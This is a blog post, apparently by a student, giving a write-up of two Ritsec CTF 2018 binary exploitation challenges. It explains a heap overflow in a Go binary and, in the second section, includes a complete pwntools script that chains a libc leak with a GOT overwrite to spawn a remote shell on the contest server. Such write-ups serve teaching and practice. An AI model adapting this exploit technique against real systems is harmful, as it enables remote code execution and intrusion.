@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[Ritsec CTF 2018] Pwn challenges</title>
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/myavatar-1-.png" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/quentin-meffre">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>[Ritsec CTF 2018] Pwn challenges </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   November 
+	   19th,
+	   
+	   2018
+	 </span>
+	  <div class="article_body">
+	  <p>Write-up of both pwn challenges <code class="highlighter-rouge">Gimme sum fud</code> and <code class="highlighter-rouge">Yet Another HR Management Framework</code> which are ELF binary compiled from Go lang.</p>
+
+<h2 id="gimme-sum-fud">Gimme sum fud</h2>
+
+<p><strong>Points:</strong> 100 <strong>Category:</strong> Pwn <strong>Author:</strong> Dagger</p>
+
+<h3 id="introduction">Introduction</h3>
+
+<p>In this challenge, we are given an ELF 64 bits binary. The binary is very simple, it read a string on its input and then display it.</p>
+
+<p>Compare to a classic heap challenge, the binary size is a bit more huge. This challenge seem’s to be classic but it is not. The binary size is 1.5 Megabytes! The binary is as huge because it is coded in <code class="highlighter-rouge">Go lang</code>.</p>
+
+<p><img src="/assets/media/pwn3_function_list.png" alt="Function_list" /></p>
+
+<p>Go lang load no more than <code class="highlighter-rouge">2053</code> functions in this binary! But we will not have to reverse every function. Only a few one will be useful for us.</p>
+
+<p>Luckily for us, the binary is not stripped. In Go lang, after compilation, the main function is renamed <code class="highlighter-rouge">main.main</code>. This is the function that interests us.</p>
+
+<h3 id="vulnerability">Vulnerability</h3>
+
+<p>The most important part of the <code class="highlighter-rouge">main.main</code> function is the one below:</p>
+
+<p><img src="/assets/media/pwn3_main_function.png" alt="Main_function" /></p>
+
+<p>The function can be summarized with the following steps:</p>
+
+<ul>
+  <li>It allocates a buffer on the heap of size 0x10 ;</li>
+  <li>It allocates a second buffer on the heap of size 0x64 ;</li>
+  <li>It read the content of the file “flag.txt” in the second buffer ;</li>
+  <li>It read 0x1337 bytes from the input in the first buffer ;</li>
+  <li>It prints the first buffer ;</li>
+</ul>
+
+<p>The vulnerability is a buffer overflow located on the heap.</p>
+
+<p>From this point it is very easy to get the flag. We will send enough writable bytes to join the second buffer and when the binary will print the first buffer, it will also print the second one.</p>
+
+<p>In Go lang, the heap seem’s to be managed differently compare to a basic C/C++ binary. There is a huge padding between the first and the second buffer. The offset between both buffer is 1360 bytes.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>Let test it:</p>
+
+<p><img src="/assets/media/pwn3_exploit.png" alt="Exploit" /></p>
+
+<p>We just need to add a ‘R’ at the beginning of the flag: <code class="highlighter-rouge">RITSEC{Muff1n_G0verFl0w_mmmm}</code></p>
+
+<p>Done.</p>
+
+<p>PS: You can find the binary and the exploit <a href="https://github.com/meffre-q/ctf/tree/master/2018/ritsec/binary/pwn3">here</a></p>
+
+<h2 id="yet-another-hr-management-framework">Yet Another HR Management Framework</h2>
+
+<p><strong>Points:</strong> 250 <strong>Category:</strong> Pwn <strong>Author:</strong> Dagger</p>
+
+<h3 id="introduction-1">Introduction</h3>
+
+<p>In this challenge, we are given an ELF 64 bits binary. The binary is a bit more complicated than the previous one.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./pwn2 
+Welcome to yet another human resources management framework!
+============================================================
+1. Create a new person
+2. Edit a person
+3. Print information about a person
+4. Delete a person
+5. This framework sucks, get me out of here!
+Enter your choice: 1
+
+Creating a new person...
+Enter name length: 20
+Enter person's name: Toto
+Enter person's age: 33
+
+Welcome to yet another human resources management framework!
+============================================================
+1. Create a new person
+2. Edit a person
+3. Print information about a person
+4. Delete a person
+5. This framework sucks, get me out of here!
+Enter your choice: 3
+
+Printing a person...
+Enter person's index (0-based): 0
+Name: Toto
+
+Age: 33
+
+Welcome to yet another human resources management framework!
+============================================================
+1. Create a new person
+2. Edit a person
+3. Print information about a person
+4. Delete a person
+5. This framework sucks, get me out of here!
+Enter your choice: 4
+
+Delete a person...
+Enter person's index (0-based): 0
+Done.
+</code></pre></div></div>
+
+<p>The binary allow us to manage a data structure on the heap which is named <code class="highlighter-rouge">person</code>. We can do the following action on the structure:</p>
+<ul>
+  <li>Create a person ;</li>
+  <li>Edit a person ;</li>
+  <li>Print a person ;</li>
+  <li>Delete a person ;</li>
+</ul>
+
+<p>The structure should look something like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">person</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">printPerson</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>There is some garbage after these fields but it is useless for our exploit.</p>
+
+<h3 id="vulnerability-1">Vulnerability</h3>
+
+<p>There are a lot of vulnerabilities in this exploit:</p>
+<ul>
+  <li>In the <code class="highlighter-rouge">Edit person</code> function, the program doesn’t check if the person targeted is free or not which can lead to a <code class="highlighter-rouge">Use After Free</code> ;</li>
+  <li>In the <code class="highlighter-rouge">Edit person</code> function, there is no boundary check on the new given name size which lead to a <code class="highlighter-rouge">heap overflow</code> ;</li>
+  <li>In the <code class="highlighter-rouge">Print person</code> function, the program doesn’t check if the person targeted is free or not which can lead to either a <code class="highlighter-rouge">Use After Free</code> or a <code class="highlighter-rouge">Memory leak</code> ;</li>
+  <li>In the <code class="highlighter-rouge">Delete person</code> function, the program doesn’t check if the person targeted is free or not which can lead to a <code class="highlighter-rouge">Double free vulnerability</code> ;</li>
+  <li>In the <code class="highlighter-rouge">Delete person</code> function, the program doesn’t zero the pointer after freed it which gave us a dangling pointer and can lead to either a <code class="highlighter-rouge">Use After Free</code> or a <code class="highlighter-rouge">Memory leak</code> ;</li>
+</ul>
+
+<p>In my exploit, I choose to use the memory leak located in the <code class="highlighter-rouge">Print person</code> function and the <code class="highlighter-rouge">heap overflow</code> located in the <code class="highlighter-rouge">Edit person</code> function. Using these vulnerabilities we can have a read/write primitive.</p>
+
+<p>We must take care of the following protections:</p>
+<ul>
+  <li>Partial RELRO is enabled, we can overwrite the entry’s of the Global Offset Table ;</li>
+  <li>Stack Smash Protection is enabled, the stack contain canary’s ;</li>
+  <li>NX is enabled, we can’t execute shellcode on the stack/heap ;</li>
+  <li>PIE is disabled, we don’t need to leak the memory ;</li>
+  <li>The source are FORTIFY, we don’t care about it. :)</li>
+</ul>
+
+<p>We will first leak the LibC, the exploit plan is the following:</p>
+<ul>
+  <li>Allocate three chunks on the heap. The first and the third one gonna be fast bins whereas the second one gonna a small bin. The third chunk is only used to avoid consolidation of the small bin with the top chunk when it will be free.</li>
+</ul>
+
+<p>Below is a picture of the heap layout after this step:</p>
+
+<p><img src="/assets/media/pwn3_heap_layout.png" alt="Heap_layout" /></p>
+
+<p>We are going to use the first <code class="highlighter-rouge">char *name</code> with the heap overflow vulnerability to overwrite the data contained in the <code class="highlighter-rouge">struct person[1]</code>.</p>
+
+<p>Next steps to have a leak:</p>
+<ul>
+  <li>Free the second chunk (small bin) to populate <code class="highlighter-rouge">free@got.plt</code> with the address of free() in the LibC.</li>
+  <li>Edit the first chunk to overflow into the second freed chunk to overwrite the <code class="highlighter-rouge">name</code> address with the GOT address of free(). (We must take care of the function pointer located before the name address because the function is called when we trigger <code class="highlighter-rouge">Print person</code>)</li>
+  <li>Call <code class="highlighter-rouge">Print person</code> to leak the LibC address of free().</li>
+</ul>
+
+<p>Then we will call system(“/bin/sh”) using the following steps:</p>
+<ul>
+  <li>Edit the first chunk, created before, to overwrite the address of name with the GOT address of free() ;</li>
+  <li>Edit the second chunk to overwrite the GOT address of free() with the address of system() ;</li>
+  <li>Edit again the first chunk to overwrite the address of the name with the one of “/bin/sh”, obtained by leaking the LibC ;</li>
+  <li>Delete again the second person to call free() and trigger system(“/bin/sh”) ;</li>
+</ul>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>I use the following exploit to get the flag:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn2"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"fun.ritsec.club"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">age</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"length: "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name: "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"age: "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(0-based): "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"length: "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name: "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(0-based): "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(0-based): "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">exit</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">leak_stack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">offset</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"printPerson"</span><span class="p">])</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">])</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="mi">180</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>                                 <span class="c1"># Allocate small bin
+</span>        <span class="bp">self</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>                                  <span class="c1"># Avoid top chunk consolidation
+</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                                               <span class="c1"># Populate free@got.plt
+</span>        <span class="bp">self</span><span class="o">.</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4000</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>                                  <span class="c1"># Heap overflow
+</span>        <span class="n">data</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">6</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span>                                      <span class="c1"># UaF to Leak
+</span>        <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">exec_system</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">):</span>
+        <span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">28</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">offset</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">])</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4000</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>                                  <span class="c1"># Overwrite name address with free@got.plt
+</span>        <span class="bp">self</span><span class="o">.</span><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span> <span class="c1"># Overwrite free@got.plt with system()
+</span>        <span class="n">payload</span><span class="o">=</span><span class="n">offset</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4000</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>                                  <span class="c1"># Overwrite name address with free@got.plt
+</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(0-based): "</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>                                         <span class="c1"># Trigger system("/bin/sh")
+</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">pwn_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">start_binary</span><span class="p">()</span>
+
+        <span class="n">libc_base</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">leak_stack</span><span class="p">()</span><span class="o">-</span><span class="bp">self</span><span class="o">.</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak libc base address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">exec_system</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">pwn</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">pwn_binary</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Let’s try it:</p>
+
+<p><img src="/assets/media/ritsec_flag.png" alt="Flag" /></p>
+
+<p>Done.</p>
+
+<p>PS: You can find the binary and the exploit <a href="https://github.com/meffre-q/ctf/tree/master/2018/ritsec/binary/HR_Management/250/dist">here</a></p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#write-up-ref">
+					write-up <span>(7)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(14)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#exploit-ref">
+					exploit <span>(2)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[Ritsec CTF 2018] Pwn challenges&via=0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/exploit/heap/2018/11/10/malloc_consolidate_exploit.html" title="malloc_consolidate overview">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2018 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
